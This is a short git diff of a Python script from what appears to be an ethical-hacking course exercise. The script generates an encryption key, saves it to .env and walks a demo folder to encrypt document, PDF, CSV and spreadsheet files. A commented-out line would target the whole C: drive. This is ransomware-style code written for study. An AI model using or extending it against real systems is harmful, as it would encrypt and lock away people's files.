@@ -25,16 +25,16 @@ def encrypt_file(key,file_path):                # PLAYING WITH FIRE!!!!!!!!!!!!!
 load_dotenv(dotenv_path='./.env',override=True)
 ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')
 
-if ENCRYPTION_KEY == None:
+if ENCRYPTION_KEY == "":
     key = Fernet.generate_key()
     try:
-        set_key('.env',"ENCRYPTION_KEY",key)
+        set_key('.env',"ENCRYPTION_KEY",str(key))
     except:
         print(key)
     file_types = ["docx", "pdf", "csv", "xlsx"]   # , "md", "txt"
 
     # path = "C:/"                     # voor alle files af te runnen ipv 1 file
-    path = "/C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/demofolder"
+    path = "C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/demofolder"
     for root, dirs, files in os.walk(path):
         for file in files:
             file_path = os.path.join(root, file)
